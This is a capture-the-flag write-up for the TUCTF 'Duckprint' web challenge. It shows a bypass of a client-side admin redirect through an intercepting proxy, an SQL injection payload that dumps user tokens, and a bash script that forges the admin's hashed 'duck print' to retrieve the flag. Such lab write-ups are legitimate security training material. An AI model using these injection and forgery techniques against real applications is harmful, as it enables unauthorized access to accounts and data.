### Solved by rasta_mouse & historypeats

Duckprint was a 100 point Web Challenge

After navigating to the challenge [URL](http://130.211.242.26:31337), we see there are 3 main pages:

*Register
*Generate
*Validate

#### Register

This is a simple page where we can register a new account.  When you do this, a cookie is assigned:
`duck_cookie=%7B%22username%22%3A%22rastamouse%22%2C%22admin%22%3A0%7D` --> `duck_cookie={"username":"rastamouse","admin":0}`

#### Generate

This page allows us to generate a 'duck print' string for any user by entering a username.  The page is nice enough to reveal how this string is generated:
`Duck Print format: sha256(b64(username) + "." + b64(cookie) + "." + b64(token))`

By putting `rastamouse` into the box, I get the following result:

```
Username:Admin:Token

rastamouse:0:Urczv4Mb
Generated Duck Print for rastamouse: e003648729932cf96d2bb0987f9b81872eaed0290873a35c17ee8fddded8381e
```

#### Validate

This page requires an admin cookie to access, however we can bypass using Burp (other interception proxies are available :)).  The server provides the following response:

```
<form id='validate' action='validate.php' method='post'
    accept-charset='UTF-8'>
<fieldset >
<legend>Validate Admin Duck Print</legend>

<input type='hidden' name='submitted' id='submitted' value='1'/>

<label for='duckprint'>Duck Print:</label>
<input type='text' name='duckprint' id='duckprint' maxlength="100" />
<input type='submit' name='submit' value='Submit' />

</fieldset>
</form>
<script language="javascript">alert("Only the admin can access this page!");location.href = "http://130.211.242.26:31337/generate.php";</script>
</body>
</html>
```

By removing the javascript in the proxy, a browser will render the page.  By putting some junk in the duckprint search box, we get the error `'That is not DuckDuckGoose's Duck Print!'`

Based on that information disclosure, we can assume that `DuckDuckGoose` is the admin and that his cookie will likely be `{"username":"DuckDuckGoose","admin":1}`.  However, we can't use the `Generate` page to get his token:  `Cannot generate admin's duck print!`

historypeats found that there was some SQLi in the generate field - there is an HTML comment containing the query being used which kinda hinted to this:  `<!-- $query = "SELECT * FROM users WHERE username ='" . $username . "'"; -->`

You can use this to force the application to display the tokens of all users with the following input:

`duckduckgoose ' or 1=1;-- -`

Which gives you:

`DuckDuckGoose:1:d4rkw1ng`

Now we have everything required to create his duck print.  I used some pretty lame bash for this.

```
#!/bin/bash

u='DuckDuckGoose'
c='{"username":"DuckDuckGoose","admin":1}'
t='d4rkw1ng'

b64_u=`echo -en $u | base64`
b64_c=`echo -en $c | base64`
b64_t=`echo -en $t | base64`

s=`echo -en $b64_u.$b64_c.$b64_t`

duck=`echo -en $s | sha256sum`

echo $duck
```

Which produces:  `d626290acdc6a948a5f2b5c2850730f4e4b2bdbd36da01226a192985d20d787d`

Feed this value into the `Validate` page, and we get our flag:

```
TUCTF{Quacky_McQuackerface}
```